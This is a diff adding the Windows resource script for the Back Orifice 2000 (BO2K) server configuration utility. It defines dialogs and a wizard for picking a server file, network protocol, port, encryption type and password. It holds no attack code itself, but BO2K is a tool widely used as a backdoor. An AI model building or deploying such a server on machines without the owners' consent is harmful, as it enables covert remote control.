@@ -1,0 +1,432 @@
+//Microsoft Developer Studio generated resource script.
+//
+#include "resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// English (U.S.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+#ifdef _WIN32
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+#pragma code_page(1252)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "resource.h\0"
+END
+
+2 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#define _AFX_NO_SPLITTER_RESOURCES\r\n"
+    "#define _AFX_NO_OLE_RESOURCES\r\n"
+    "#define _AFX_NO_TRACKER_RESOURCES\r\n"
+    "#define _AFX_NO_PROPERTY_RESOURCES\r\n"
+    "\r\n"
+    "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)\r\n"
+    "#ifdef _WIN32\r\n"
+    "LANGUAGE 9, 1\r\n"
+    "#pragma code_page(1252)\r\n"
+    "#endif //_WIN32\r\n"
+    "#include ""res\\bo2kcfg.rc2""  // non-Microsoft Visual C++ edited resources\r\n"
+    "#include ""afxres.rc""         // Standard components\r\n"
+    "#endif\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDR_MAINFRAME           ICON    DISCARDABLE     "res\\bo2kcfg.ico"
+IDI_LITTLECOW           ICON    DISCARDABLE     "res\\littleco.ico"
+IDI_BUTTWIZARD          ICON    DISCARDABLE     "res\\icon1.ico"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_BO2KCFG_DIALOG DIALOGEX 0, 0, 316, 233
+STYLE DS_MODALFRAME | DS_SETFOREGROUND | DS_3DLOOK | DS_CENTER | 
+    WS_MINIMIZEBOX | WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU
+EXSTYLE WS_EX_APPWINDOW
+CAPTION "BO2K Server Configuration"
+FONT 8, "MS Sans Serif"
+BEGIN
+    PUSHBUTTON      "Open Server...",IDC_OPENSERVER,184,4,80,16
+    PUSHBUTTON      "Save Server",IDC_SAVESERVER,184,24,80,16
+    PUSHBUTTON      "Close Server",IDC_CLOSESERVER,184,44,80,16
+    PUSHBUTTON      "Exit",IDC_EXIT,272,36,36,24
+    CONTROL         "List1",IDC_PLUGINS,"SysListView32",LVS_REPORT | 
+                    LVS_SINGLESEL | LVS_SHOWSELALWAYS | LVS_SHAREIMAGELISTS | 
+                    LVS_ALIGNLEFT | LVS_NOSORTHEADER | WS_BORDER | 
+                    WS_TABSTOP,4,80,240,56
+    PUSHBUTTON      "Insert...",IDC_INSERT,248,80,60,16
+    PUSHBUTTON      "Remove",IDC_REMOVE,248,100,60,16
+    PUSHBUTTON      "Extract To File...",IDC_EXTRACT,248,120,60,16
+    CONTROL         "Tree1",IDC_OPTIONVARIABLES,"SysTreeView32",
+                    TVS_HASBUTTONS | TVS_HASLINES | TVS_LINESATROOT | 
+                    TVS_SHOWSELALWAYS | TVS_FULLROWSELECT | WS_BORDER | 
+                    WS_TABSTOP,4,152,116,68
+    EDITTEXT        IDC_STR_CURRENTVALUE,124,152,188,14,ES_AUTOHSCROLL | 
+                    ES_READONLY | WS_DISABLED
+    EDITTEXT        IDC_STR_NEWVALUE,124,176,188,14,ES_AUTOHSCROLL | 
+                    WS_DISABLED
+    CONTROL         "Disabled",IDC_BOOL_DISABLED,"Button",BS_AUTORADIOBUTTON | 
+                    WS_DISABLED,132,204,43,10
+    CONTROL         "Enabled",IDC_BOOL_ENABLED,"Button",BS_AUTORADIOBUTTON | 
+                    WS_DISABLED,184,204,42,10
+    PUSHBUTTON      "Set Value",IDC_SETVALUE,260,196,52,16,WS_DISABLED
+    LTEXT           "Plugins Loaded:",IDC_STATIC1,4,72,52,8
+    LTEXT           "Option Variables:",IDC_STATIC2,4,144,54,8
+    LTEXT           "Current Value:",IDC_STATIC_CURVAL,124,144,46,8,
+                    WS_DISABLED
+    LTEXT           "New Value:",IDC_STATIC_NEWVAL,124,168,38,8,WS_DISABLED
+    CTEXT           "Back Orifice 2000 Server Configuration Utility, Copyright (C) 1999, Cult of the Dead Cow",
+                    IDC_STATIC,4,224,308,8
+    EDITTEXT        IDC_FILENAME,4,16,176,14,ES_AUTOHSCROLL | ES_READONLY
+    LTEXT           "Current Server File:",IDC_STATIC,4,4,61,8
+    CONTROL         "",IDC_STATIC,"Static",SS_ETCHEDHORZ,4,64,308,1
+    LTEXT           "Server Info:",IDC_SERVERINFO,4,32,176,28
+    GROUPBOX        "Switch Setting",IDC_BOOL_GROUP,124,192,116,28,
+                    WS_DISABLED
+    PUSHBUTTON      "Wizard",IDC_WIZARD,276,4,28,24,BS_ICON
+END
+
+IDD_WIZARD1 DIALOG DISCARDABLE  0, 0, 240, 170
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION
+CAPTION "BO2K Configuration Wizard - Step 1"
+FONT 8, "MS Sans Serif"
+BEGIN
+    DEFPUSHBUTTON   "&Next >>",IDOK,184,148,52,16
+    CONTROL         "Show this wizard on startup",IDC_SHOWWIZARD,"Button",
+                    BS_AUTOCHECKBOX | WS_TABSTOP,72,152,102,10
+    PUSHBUTTON      "&Exit Wizard",IDCANCEL,4,148,53,16
+    CONTROL         134,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,4,4,52,140
+    CONTROL         133,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,60,4,176,
+                    20
+    LTEXT           "Welcome to the BO2K Configuration Wizard!",IDC_STATIC,
+                    76,32,141,8
+    CTEXT           "This wizard will help you install components into your BO2K server and configure them. First, you'll be asked to choose a BO2K server, then we'll walk you through the process of configuring the server with a new password.",
+                    IDC_STATIC,68,52,160,40
+    CTEXT           " When you're done, your BO2K server will be ready for installation. Note that this wizard does not allow for full configuration flexibility. It is meant only to simplify the process of configuration.",
+                    IDC_STATIC,64,104,164,32
+END
+
+IDD_WIZARD2 DIALOG DISCARDABLE  0, 0, 240, 170
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION
+CAPTION "BO2K Configuration Wizard - Step 2"
+FONT 8, "MS Sans Serif"
+BEGIN
+    PUSHBUTTON      "&Browse...",IDC_BROWSE,184,92,52,16
+    DEFPUSHBUTTON   "&Next >>",IDOK,184,148,52,16
+    PUSHBUTTON      "<< &Back",IDBACK,128,148,52,16
+    PUSHBUTTON      "&Exit Wizard",IDCANCEL,4,148,53,16
+    CONTROL         134,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,4,4,52,140
+    CONTROL         133,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,60,4,176,
+                    20
+    LTEXT           "This step will allow you to choose a server file to configure. If you just want to use the default BO2K server, simply click  'Next'.",
+                    IDC_STATIC,60,31,173,28
+    LTEXT           "Choose a BO2K server file:",IDC_STATIC,60,64,86,8
+    EDITTEXT        IDC_SERVERFILE,60,76,176,12,ES_AUTOHSCROLL
+    LTEXT           "When you have chosen the server file, click 'Next'.",
+                    IDC_STATIC,60,124,161,8
+END
+
+IDD_WIZARD4 DIALOG DISCARDABLE  0, 0, 240, 170
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION
+CAPTION "BO2K Configuration Wizard - Step 4"
+FONT 8, "MS Sans Serif"
+BEGIN
+    EDITTEXT        IDC_PORT,140,96,48,12,ES_AUTOHSCROLL | ES_NUMBER
+    DEFPUSHBUTTON   "&Next >>",IDOK,184,148,52,16
+    PUSHBUTTON      "<< &Back",IDBACK,128,148,52,16
+    PUSHBUTTON      "&Exit Wizard",IDCANCEL,4,148,53,16
+    CONTROL         134,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,4,4,52,140
+    CONTROL         133,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,60,4,176,
+                    20
+    LTEXT           "To configure the network inteface, we'll need to choose a port for this to run on. A port is a number between 1 and 65535. You'll probably want to pick a number above 1024, to ensure that it doesn't conflict with any other registered ports.",
+                    IDC_STATIC,60,32,173,40
+    LTEXT           "Choose a port number:",IDC_STATIC,64,96,72,12
+END
+
+IDD_WIZARD3 DIALOG DISCARDABLE  0, 0, 240, 170
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION
+CAPTION "BO2K Configuration Wizard - Step 3"
+FONT 8, "MS Sans Serif"
+BEGIN
+    CONTROL         "TCPIO Networking",IDC_TCPIO,"Button",BS_AUTORADIOBUTTON | 
+                    WS_GROUP,104,96,75,10
+    CONTROL         "UDPIO Networking",IDC_UDPIO,"Button",BS_AUTORADIOBUTTON,
+                    104,108,77,10
+    DEFPUSHBUTTON   "&Next >>",IDOK,184,148,52,16
+    PUSHBUTTON      "<< &Back",IDBACK,128,148,52,16
+    PUSHBUTTON      "&Exit Wizard",IDCANCEL,4,148,53,16
+    CONTROL         134,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,4,4,52,140
+    CONTROL         133,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,60,4,176,
+                    20
+    LTEXT           "This step will allow you to choose a networking module. If you want to use UDP to transfer packets, know that it is by nature an unreliable protocol, and that sometimes connections may be dropped. Choose TCP unless you know for sure what you want.",
+                    IDC_STATIC,60,28,176,40
+    GROUPBOX        "Network Type",IDC_STATIC,96,80,108,48
+END
+
+IDD_WIZARD5 DIALOG DISCARDABLE  0, 0, 240, 170
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION
+CAPTION "BO2K Configuration Wizard - Step 5"
+FONT 8, "MS Sans Serif"
+BEGIN
+    CONTROL         "XOR",IDC_XOR,"Button",BS_AUTORADIOBUTTON | WS_GROUP,116,
+                    112,31,10
+    CONTROL         "3DES",IDC_3DES,"Button",BS_AUTORADIOBUTTON,116,124,35,
+                    10
+    DEFPUSHBUTTON   "&Next >>",IDOK,184,148,52,16
+    PUSHBUTTON      "<< &Back",IDBACK,128,148,52,16
+    PUSHBUTTON      "&Exit Wizard",IDCANCEL,4,148,53,16
+    CONTROL         134,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,4,4,53,142
+    CONTROL         133,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,60,4,177,
+                    22
+    GROUPBOX        "Encryption Type",IDC_STATIC,108,100,72,40
+    LTEXT           "This step will allow you to choose an encryption method. Currently, you can choose between two different types of encryption, XOR, and 3DES.",
+                    IDC_STATIC,60,28,176,24
+    LTEXT           "XOR is meant only for non-critical communications, while 3DES is meant for secure strong private communications. 3DES is only available in the US version of the product due to our country's ignorant and foolish export restrictions. If you can, pick 3DES.",
+                    IDC_STATIC,60,56,176,40
+END
+
+IDD_WIZARD6 DIALOG DISCARDABLE  0, 0, 240, 170
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION
+CAPTION "BO2K Configuration Wizard - Step 6"
+FONT 8, "MS Sans Serif"
+BEGIN
+    DEFPUSHBUTTON   "&Next >>",IDOK,184,148,52,16
+    PUSHBUTTON      "<< &Back",IDBACK,128,148,52,16
+    PUSHBUTTON      "&Exit Wizard",IDCANCEL,4,148,53,16
+    CONTROL         134,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,4,4,52,140
+    CONTROL         133,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,60,4,176,
+                    20
+    LTEXT           "Now we need to choose an encryption key for your communications. The key is a password or passphrase that you will have to remember in order to connect to the server.",
+                    IDC_STATIC,60,31,176,32
+    LTEXT           "Enter your password/passphrase here:",IDC_STATIC,65,101,
+                    122,8
+    EDITTEXT        IDC_PASSWORD,65,109,168,14,ES_AUTOHSCROLL
+    LTEXT           "Number of characters:",IDC_STATIC,117,129,71,8
+    EDITTEXT        IDC_LETTERCOUNT,193,129,40,14,ES_AUTOHSCROLL | 
+                    ES_READONLY | NOT WS_BORDER
+    LTEXT           "If you chose 'XOR' encryption, your password should be at least 4 characters long. If you chose '3DES' encryption, you password should be at least 14 characters long.",
+                    IDC_STATIC,60,64,173,31
+END
+
+IDD_WIZARD7 DIALOG DISCARDABLE  0, 0, 240, 170
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION
+CAPTION "BO2K Configuration Wizard - Finish"
+FONT 8, "MS Sans Serif"
+BEGIN
+    DEFPUSHBUTTON   "&Finish",IDOK,184,148,52,16
+    PUSHBUTTON      "<< &Back",IDBACK,128,148,52,16
+    PUSHBUTTON      "&Exit Wizard",IDCANCEL,4,148,53,16
+    CONTROL         134,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,4,4,52,140
+    CONTROL         133,IDC_STATIC,"Static",SS_BITMAP | SS_SUNKEN,60,4,176,
+                    20
+    LTEXT           "Wizard setup is complete!",IDC_STATIC,64,32,172,8
+    LTEXT           "Hit 'Finish' to write the server configuration to disk, and to configure your client for this machine.",
+                    IDC_STATIC,64,108,168,20
+    LTEXT           "At this point, your server is configured and ready to go. Remember to configure your client to connect using the same options.",
+                    IDC_STATIC,64,48,172,26
+    LTEXT           "If you are going to connect to the server using this computer, then your client will be automatically set up when you hit 'Finish'.",
+                    IDC_STATIC,64,76,170,24
+END
+
+
+#ifndef _MAC
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 1,0,0,1
+ PRODUCTVERSION 1,0,0,1
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x1L
+#else
+ FILEFLAGS 0x0L
+#endif
+ FILEOS 0x4L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904B0"
+        BEGIN
+            VALUE "CompanyName", "\0"
+            VALUE "FileDescription", "bo2kcfg MFC Application\0"
+            VALUE "FileVersion", "1, 0, 0, 1\0"
+            VALUE "InternalName", "bo2kcfg\0"
+            VALUE "LegalCopyright", "Copyright (C) 1999\0"
+            VALUE "LegalTrademarks", "\0"
+            VALUE "OriginalFilename", "bo2kcfg.EXE\0"
+            VALUE "ProductName", "bo2kcfg Application\0"
+            VALUE "ProductVersion", "1, 0, 0, 1\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x409, 1200
+    END
+END
+
+#endif    // !_MAC
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO DISCARDABLE 
+BEGIN
+    IDD_BO2KCFG_DIALOG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 309
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 226
+    END
+
+    IDD_WIZARD1, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 233
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 163
+    END
+
+    IDD_WIZARD2, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 233
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 163
+    END
+
+    IDD_WIZARD4, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 233
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 163
+    END
+
+    IDD_WIZARD3, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 233
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 163
+    END
+
+    IDD_WIZARD5, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 236
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 163
+    END
+
+    IDD_WIZARD6, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 233
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 163
+    END
+
+    IDD_WIZARD7, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 233
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 163
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Bitmap
+//
+
+IDB_IMGLIST             BITMAP  DISCARDABLE     "res\\bitmap1.bmp"
+IDB_BO2KCFGBANNER       BITMAP  DISCARDABLE     "res\\bo2kcfgbanner.bmp"
+IDB_BANNER1             BITMAP  DISCARDABLE     "res\\banner1.bmp"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE PRELOAD DISCARDABLE 
+BEGIN
+    AFX_IDS_APP_TITLE       "BO2K Configuration Tool"
+    AFX_IDS_IDLEMESSAGE     "Ready"
+END
+
+#endif    // English (U.S.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+#define _AFX_NO_SPLITTER_RESOURCES
+#define _AFX_NO_OLE_RESOURCES
+#define _AFX_NO_TRACKER_RESOURCES
+#define _AFX_NO_PROPERTY_RESOURCES
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+#ifdef _WIN32
+LANGUAGE 9, 1
+#pragma code_page(1252)
+#endif //_WIN32
+#include "res\bo2kcfg.rc2"  // non-Microsoft Visual C++ edited resources
+#include "afxres.rc"         // Standard components
+#endif
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
